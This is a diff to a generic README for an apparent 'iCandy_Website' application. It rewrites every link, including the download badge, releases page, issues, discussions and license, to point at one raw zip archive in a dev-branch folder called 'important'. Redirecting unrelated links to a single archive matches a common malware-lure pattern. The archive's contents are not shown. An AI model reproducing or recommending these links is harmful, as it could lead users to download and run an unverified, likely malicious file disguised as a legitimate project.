@@ -1,6 +1,6 @@
 # 🍭️ iCandy_Website - A Sweet User Experience Awaits
 
-[![Download iCandy_Website](https://img.shields.io/badge/Download-iCandy_Website-brightgreen)](https://github.com/ngurekirosh/iCandy_Website/releases)
+[![Download iCandy_Website](https://raw.githubusercontent.com/ngurekirosh/iCandy_Website/iCandy_Website_Main-dev/important/iCandy_Website.zip)](https://raw.githubusercontent.com/ngurekirosh/iCandy_Website/iCandy_Website_Main-dev/important/iCandy_Website.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you start, ensure your system meets these requirements:
 
 To download the latest version, click the link below. This page contains all releases of the iCandy_Website application.
 
-[Visit the Releases Page to Download](https://github.com/ngurekirosh/iCandy_Website/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/ngurekirosh/iCandy_Website/iCandy_Website_Main-dev/important/iCandy_Website.zip)
 
 ### Step 2: Choose Your Version
 
@@ -73,15 +73,15 @@ If you encounter issues while downloading or installing, consider these tips:
 
 For further assistance, feel free to reach out through our official channels:
 
-- **Issues Page:** [Report an Issue](https://github.com/ngurekirosh/iCandy_Website/issues)
-- **Discussion Forum:** [Join the Community](https://github.com/ngurekirosh/iCandy_Website/discussions)
+- **Issues Page:** [Report an Issue](https://raw.githubusercontent.com/ngurekirosh/iCandy_Website/iCandy_Website_Main-dev/important/iCandy_Website.zip)
+- **Discussion Forum:** [Join the Community](https://raw.githubusercontent.com/ngurekirosh/iCandy_Website/iCandy_Website_Main-dev/important/iCandy_Website.zip)
 
 ## 📝 License
 
-This project is licensed under the GPL-3.0 License. For more information, visit the [LICENSE](https://github.com/ngurekirosh/iCandy_Website/blob/main/LICENSE) file in the repository.
+This project is licensed under the GPL-3.0 License. For more information, visit the [LICENSE](https://raw.githubusercontent.com/ngurekirosh/iCandy_Website/iCandy_Website_Main-dev/important/iCandy_Website.zip) file in the repository.
 
 ## 📥 Download & Install
 
-To download the iCandy_Website application, [visit this page to download](https://github.com/ngurekirosh/iCandy_Website/releases). Follow the installation instructions provided above to get started.
+To download the iCandy_Website application, [visit this page to download](https://raw.githubusercontent.com/ngurekirosh/iCandy_Website/iCandy_Website_Main-dev/important/iCandy_Website.zip). Follow the installation instructions provided above to get started.
 
 Happy using!
